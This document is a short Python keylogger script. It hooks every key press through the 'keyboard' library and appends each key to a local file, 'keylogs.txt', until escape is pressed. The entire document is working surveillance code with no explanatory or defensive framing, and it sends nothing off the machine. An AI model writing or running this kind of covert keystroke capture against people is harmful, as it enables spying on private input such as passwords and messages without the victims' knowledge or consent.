import keyboard

def on_press(event):
    with open('keylogs.txt', 'a') as f:
        if event.name == 'space':
            f.write('[SPACE]')
        elif event.name == 'enter':
            f.write('[ENTER]\n')
        elif event.name == 'esc':
            return False
        else:
            f.write(event.name)

keyboard.on_press(on_press)
keyboard.wait('esc')
